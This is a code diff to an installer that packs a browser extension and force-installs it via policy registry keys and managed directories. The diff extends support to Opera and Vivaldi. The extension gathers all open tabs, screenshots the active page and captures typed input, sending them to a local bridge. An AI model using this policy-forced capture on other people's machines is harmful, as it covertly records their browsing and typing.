@@ -302,7 +302,7 @@ hex_id = hashlib.sha256(pub_der).hexdigest()[:32]
 ext_id = ''.join(chr(ord('a') + int(ch, 16)) for ch in hex_id)
 
 packer = None
-for candidate in ['google-chrome', 'google-chrome-stable', 'chromium', 'chromium-browser', 'brave-browser', 'microsoft-edge', 'microsoft-edge-stable', 'opera']:
+for candidate in ['google-chrome', 'google-chrome-stable', 'chromium', 'chromium-browser', 'brave-browser', 'microsoft-edge', 'microsoft-edge-stable', 'opera', 'vivaldi', 'vivaldi-stable']:
     if shutil.which(candidate):
         packer = candidate
         break
@@ -316,7 +316,7 @@ if packer:
         generated.replace(crx_path)
 
 if not crx_path.exists():
-    print('WARNING: could not pack browser extension; install Chrome/Chromium/Brave/Edge/Opera and rerun installer.')
+    print('WARNING: could not pack browser extension; install Chrome/Chromium/Brave/Edge/Opera/Vivaldi and rerun installer.')
 else:
     crx_uri = crx_path.resolve().as_uri()
     update_xml.write_text('<?xml version="1.0" encoding="UTF-8"?><gupdate xmlns="http://www.google.com/update2/response" protocol="2.0"><app appid="' + ext_id + '"><updatecheck codebase="' + crx_uri + '" version="' + version + '" /></app></gupdate>', encoding='utf-8')
@@ -338,6 +338,7 @@ else:
         ('Brave', ['brave-browser'], ['/etc/brave/policies/managed'], ['/usr/share/brave/extensions', '/usr/share/brave-browser/extensions']),
         ('Microsoft Edge', ['microsoft-edge', 'microsoft-edge-stable'], ['/etc/opt/edge/policies/managed'], ['/usr/share/microsoft-edge/extensions']),
         ('Opera', ['opera', 'opera-stable'], ['/etc/opt/opera/policies/managed'], ['/usr/share/opera/extensions']),
+        ('Vivaldi', ['vivaldi', 'vivaldi-stable'], ['/etc/opt/vivaldi/policies/managed'], ['/usr/share/vivaldi/extensions', '/usr/share/vivaldi-stable/extensions']),
     ]
     if os.geteuid() == 0:
         privileged: list[str] | None = []
@@ -635,7 +636,7 @@ function Install-BrowserExtension {
 '@ | Set-Content -Encoding UTF8 (Join-Path $ExtDir 'manifest.json')
   @'
 const BRIDGE = 'http://127.0.0.1:8766';
-function browserName(){const ua=navigator.userAgent||''; if(ua.includes('Edg/')) return 'Microsoft Edge'; if(navigator.brave) return 'Brave'; if(ua.includes('Chrome/')) return 'Google Chrome'; return 'Chromium';}
+function browserName(){const ua=navigator.userAgent||''; if(ua.includes('Edg/')) return 'Microsoft Edge'; if(ua.includes('OPR/')||ua.includes('Opera')) return 'Opera'; if(navigator.brave) return 'Brave'; if(ua.includes('Vivaldi')) return 'Vivaldi'; if(ua.includes('Chrome/')) return 'Google Chrome'; return 'Chromium';}
 async function post(path,payload){try{await fetch(BRIDGE+path,{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify(payload)});}catch(error){}}
 async function collectTabs(){const tabs=await chrome.tabs.query({}); await post('/browser-state',{browser:browserName(),tabs:tabs,capturedAt:new Date().toISOString()});}
 async function captureActiveVisibleTab(){try{const tabs=await chrome.tabs.query({active:true,lastFocusedWindow:true}); const tab=tabs&&tabs[0]; if(!tab||!tab.id||!tab.windowId||!tab.url||!/^(https?|file):/i.test(tab.url))return; const dataUrl=await chrome.tabs.captureVisibleTab(tab.windowId,{format:'jpeg',quality:60}); await post('/browser-screenshot',{browser:browserName(),tabId:tab.id,windowId:tab.windowId,title:tab.title,url:tab.url,dataUrl:dataUrl,capturedAt:new Date().toISOString()});}catch(error){}}
@@ -656,9 +657,11 @@ document.addEventListener('input',(event)=>{const raw=event.target; if(!raw) ret
   $Browser = @(
     "$env:ProgramFiles\Google\Chrome\Application\chrome.exe", "$env:ProgramFiles(x86)\Google\Chrome\Application\chrome.exe",
     "$env:ProgramFiles\BraveSoftware\Brave-Browser\Application\brave.exe", "$env:ProgramFiles(x86)\BraveSoftware\Brave-Browser\Application\brave.exe",
-    "$env:ProgramFiles(x86)\Microsoft\Edge\Application\msedge.exe", "$env:ProgramFiles\Microsoft\Edge\Application\msedge.exe"
+    "$env:ProgramFiles(x86)\Microsoft\Edge\Application\msedge.exe", "$env:ProgramFiles\Microsoft\Edge\Application\msedge.exe",
+    "$env:ProgramFiles\Opera\launcher.exe", "$env:LOCALAPPDATA\Programs\Opera\launcher.exe",
+    "$env:ProgramFiles\Vivaldi\Application\vivaldi.exe", "$env:LOCALAPPDATA\Vivaldi\Application\vivaldi.exe"
   ) | Where-Object { Test-Path $_ } | Select-Object -First 1
-  if (!$Browser) { Write-Host 'Browser extension packaged files created, but Chrome/Brave/Edge was not found.'; return }
+  if (!$Browser) { Write-Host 'Browser extension packaged files created, but Chrome/Brave/Edge/Opera/Vivaldi was not found.'; return }
   Remove-Item $CrxPath -Force -ErrorAction SilentlyContinue
   if (Test-Path $KeyPath) { & $Browser --pack-extension=$ExtDir --pack-extension-key=$KeyPath | Out-Null } else { & $Browser --pack-extension=$ExtDir | Out-Null }
   $GeneratedCrx = $ExtDir + '.crx'; $GeneratedPem = $ExtDir + '.pem'
@@ -676,9 +679,9 @@ document.addEventListener('input',(event)=>{const raw=event.target; if(!raw) ret
   $UpdateXmlText = '<?xml version="1.0" encoding="UTF-8"?><gupdate xmlns="http://www.google.com/update2/response" protocol="2.0"><app appid="' + $ExtId + '"><updatecheck codebase="' + $CrxUri + '" version="1.0.1" /></app></gupdate>'
   Set-Content -Encoding UTF8 -Path $UpdateXml -Value $UpdateXmlText
   $UpdateUri = (New-Object System.Uri($UpdateXml)).AbsoluteUri
-  $PolicyRoots = @('HKCU:\Software\Policies\Google\Chrome\ExtensionInstallForcelist','HKCU:\Software\Policies\BraveSoftware\Brave\ExtensionInstallForcelist','HKCU:\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist')
+  $PolicyRoots = @('HKCU:\Software\Policies\Google\Chrome\ExtensionInstallForcelist','HKCU:\Software\Policies\BraveSoftware\Brave\ExtensionInstallForcelist','HKCU:\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist','HKCU:\Software\Policies\Opera Software\Opera Stable\ExtensionInstallForcelist','HKCU:\Software\Policies\Vivaldi\ExtensionInstallForcelist')
   foreach ($Root in $PolicyRoots) { New-Item -Force -Path $Root | Out-Null; New-ItemProperty -Force -Path $Root -Name '1' -Value ($ExtId + ';' + $UpdateUri) -PropertyType String | Out-Null }
-  Write-Host ('Browser typing extension configured. Extension id: ' + $ExtId + '. Restart Chrome/Brave/Edge once if it is already open.')
+  Write-Host ('Browser typing extension configured. Extension id: ' + $ExtId + '. Restart Chrome/Brave/Edge/Opera/Vivaldi once if already open.')
 }
 Install-BrowserExtension
 @'
